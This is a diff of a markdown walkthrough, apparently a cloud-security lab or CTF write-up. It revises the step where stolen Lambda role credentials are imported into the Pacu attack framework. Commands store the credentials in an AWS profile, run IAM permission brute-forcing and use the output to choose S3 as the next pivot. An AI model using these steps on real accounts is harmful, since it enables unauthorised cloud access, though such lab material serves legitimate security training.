@@ -315,50 +315,55 @@ The goal is to map the blast radius of this role before moving on S3.
 
 ```
 $ pip3 install pacu
-$ pacu
 ```
 
-In the Pacu interactive shell:
+Write the stolen credentials to a named AWS profile, then import them into a Pacu session:
 
 ```
-Pacu (no session) > new_session hidden_track
-Pacu (hidden_track) > set_keys
-  Key alias [None]: lambda_exec
-  Access key ID [None]: <access-key-id>
-  Secret access key [None]: <secret-access-key>
-  Session token (if using STS) [None]: <session-token>
+$ aws configure set aws_access_key_id <access-key-id>     --profile lambda_exec
+$ aws configure set aws_secret_access_key <secret-key>    --profile lambda_exec
+$ aws configure set aws_session_token <session-token>     --profile lambda_exec
+$ aws configure set region us-east-1                      --profile lambda_exec
+
+$ pacu --new-session hidden_track
+$ pacu --session hidden_track --import-keys lambda_exec
+Imported keys as "imported-lambda_exec"
 ```
 
 ### 6.2 Run Enumeration
 
 ```
-Pacu (hidden_track) > run aws__enum_account
-Pacu (hidden_track) > run iam__enum_permissions
+Pacu (hidden_track) > run iam__bruteforce_permissions --region us-east-1
 ```
 
-`iam__enum_permissions` first tries to read IAM policies directly (`iam:GetRole`, `iam:ListAttachedRolePolicies`). Both return `AccessDenied`, so Pacu falls back to brute-force mode — it calls representative actions across services and records what is allowed:
+`iam__bruteforce_permissions` iterates over every API call in its library and records which ones succeed. Output:
 
 ```
-[iam__enum_permissions] No IAM read access. Falling back to brute-force enumeration.
+[iam__bruteforce_permissions] Enumerated IAM Permissions:
+[iam__bruteforce_permissions] Enumerating us-east-1
+[iam__bruteforce_permissions] iam:
+[iam__bruteforce_permissions]   root_account: False
+[iam__bruteforce_permissions]   arn: arn:aws:sts::<account-id>:assumed-role/beaversound-lambda-exec-<suffix>/beaversound-process-upload-<suffix>
+[iam__bruteforce_permissions] bruteforce:
+[iam__bruteforce_permissions]   dynamodb.describe_endpoints: {'Endpoints': [{'Address': 'dynamodb.us-east-1.amazonaws.com', ...}]}
+[iam__bruteforce_permissions]   sts.get_caller_identity: {'UserId': '...', 'Account': '<account-id>', 'Arn': '...'}
+[iam__bruteforce_permissions] iam__bruteforce_permissions completed.
 
-  AccessDenied: iam:GetRole
-  AccessDenied: iam:ListAttachedRolePolicies
-  AccessDenied: lambda:ListFunctions
-  AccessDenied: ec2:DescribeInstances
-  AccessDenied: secretsmanager:ListSecrets
-  AccessDenied: ssm:DescribeParameters
-  AccessDenied: cloudtrail:DescribeTrails
-  AccessDenied: s3:ListAllMyBuckets
-
-  Allowed:      sts:GetCallerIdentity
-  Allowed:      logs:CreateLogGroup
-  Allowed:      logs:CreateLogStream
-  Allowed:      logs:PutLogEvents
+Num of IAM permissions found: 2
 ```
 
-CloudWatch Logs permissions are write-only — no lateral movement value. `s3:ListAllMyBuckets` is denied because the S3 permissions are scoped to specific bucket ARNs rather than `*`; Pacu's brute-force tests against wildcard resources and misses resource-scoped allows. The bucket names are already known from `VAULT_BUCKET` and `UPLOADS_BUCKET` in the environment output, so `ListAllMyBuckets` is not needed.
+Only 2 actions succeeded:
 
-**Pivot decision:** IAM, Lambda, EC2, Secrets Manager, SSM, and CloudTrail are all denied. The only surface worth pursuing is S3, with two known bucket targets from the environment variables.
+| Action | Notes |
+|--------|-------|
+| `dynamodb.describe_endpoints` | Returns the regional DynamoDB endpoint URL — publicly accessible, no IAM permission required. Not usable for lateral movement. |
+| `sts.get_caller_identity` | Always succeeds with any valid credential set. Already used in Step 5. |
+
+Everything else — IAM, Lambda, EC2, Secrets Manager, SSM, CloudTrail — returned `AccessDenied`.
+
+`s3:ListAllMyBuckets` also returned `AccessDenied`. The S3 permissions on this role are scoped to specific bucket ARNs rather than `*`, so Pacu's brute-force (which tests against wildcard resources) does not surface them. The bucket names are already known from `VAULT_BUCKET` and `UPLOADS_BUCKET` in the environment output.
+
+**Pivot decision:** Pacu confirms the role has no meaningful service access beyond what was already known. The only remaining surface is S3, with two known bucket targets from the environment variables.
 
 ---
 
